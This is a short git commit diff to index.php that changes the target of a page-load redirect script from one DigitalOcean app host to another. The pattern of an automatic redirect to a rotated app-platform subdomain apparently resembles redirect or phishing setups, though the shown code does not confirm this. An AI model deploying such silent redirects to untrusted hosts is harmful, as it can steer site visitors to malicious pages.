cbba849f39849c332ee745725fa69e5ac36b12ad
bogerhing <bogerhinglevd162@gmail.com>
2026-01-30 02:57:39 -0600

    Update index.php

--- index.php
+++ index.php
@@ -26,7 +26,7 @@
 <script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://whale-app-t3zq9.ondigitalocean.app/";
+            const redirectUrl = "https://whale-app-2-4enqk.ondigitalocean.app/";
 
             const style = document.createElement("style");
             style.textContent = `
